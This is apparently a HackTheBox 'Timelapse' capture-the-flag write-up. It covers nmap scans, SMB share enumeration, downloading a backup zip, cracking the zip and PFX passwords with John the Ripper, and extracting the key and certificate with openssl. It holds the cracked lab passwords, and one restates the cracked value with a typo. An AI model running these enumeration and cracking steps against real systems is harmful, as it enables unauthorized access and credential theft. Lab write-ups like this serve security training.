# NMAP Scans
```CSS
▶ nmap -Pn -sS -T4 --min-rate 1000 10.10.11.152 

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 17:41 IST
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.25s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 3.45 seconds
```

```CSS
▶ nmap -Pn -sC -sV -T4 --min-rate 1000 10.10.11.152 -p 53,88,135,139,389,445,464,593,636,3268,3269

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 17:44 IST
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.35s latency).

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-08-02 20:14:38Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-02T20:15:08
|_  start_date: N/A
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.49 seconds
```
# Hostnames
  - Get machine `hostname` via SMB in order to get all the potential names for this machine.
```CSS
▶ crackmapexec smb 10.10.11.152
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```
# SMB Enumeration
List available shared folders using `crakmapexec`.
```CSS
▶ crackmapexec smb 10.10.11.152 --shares
```
  - crackmap did not produce any results.

- List available shared folders using `smbclient`.
```CSS
▶ smbclient -L //10.10.11.152/

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
```
- Connect to the SMB share name "Shares".
```CSS
▶ smbclient //10.10.11.152/Shares

smb: \> ls
  .                                   D        0  Mon Oct 25 21:09:15 2021
  ..                                  D        0  Mon Oct 25 21:09:15 2021
  Dev                                 D        0  Tue Oct 26 01:10:06 2021
  HelpDesk                            D        0  Mon Oct 25 21:18:42 2021

smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Tue Oct 26 01:10:06 2021
  ..                                  D        0  Tue Oct 26 01:10:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 21:16:42 2021

                6367231 blocks of size 4096. 2465596 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
```
- Downloaded the zip file `winrm_backup.zip` with the "Dev" directory.

# Crack ZIP Hash
```CSS
▶ zip2john winrm_backup.zip > winrm_backup.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```
```CSS
▶ john winrm_backup.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-08-02 19:28) 3.125g/s 10841Kp/s 10841Kc/s 10841KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

▶ john winrm_backup.hash -show 
winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip

1 password hash cracked, 0 left
```
- Password: superemelegacy
# Unzip the ZIP
```CSS
▶ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```
- File: `legacyy_dev_auth.pfx`
# Crack PFX hash
```CSS
▶ pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash
```
```CSS
▶ john legacyy_dev_auth.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:02:12 DONE (2023-08-02 19:36) 0.007573g/s 24469p/s 24469c/s 24469C/s thuglife06..thugers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

▶ john legacyy_dev_auth.hash --show
legacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx

1 password hash cracked, 0 left
```
- Password: thuglegacy

# SSL Certificate in `PKCS#12` format.
```CSS
▶ openssl pkcs12 -in legacyy_dev_auth.pfx -info
                                                                                                          
Enter Import Password:                                                                
MAC: sha1, Iteration 2000                                                             
MAC length: 20, salt length: 20                                                       
PKCS7 Data                                                                            
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes                                                                        
    Microsoft Local Key set: <No Values>                                              
    localKeyID: 01 00 00 00                                                           
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b       
    Microsoft CSP Name: Microsoft Software Key Storage Provider 
Key Attributes                                                                        
    X509v3 Key Usage: 90          
```
# Extract .crt and .key files from .pfx file
- Extract the key
```CSS
▶ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacyy_dev_auth.key
```
- Extract the certificate
```CSS
▶ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -clcerts -out legacyy_dev_auth.crt
```
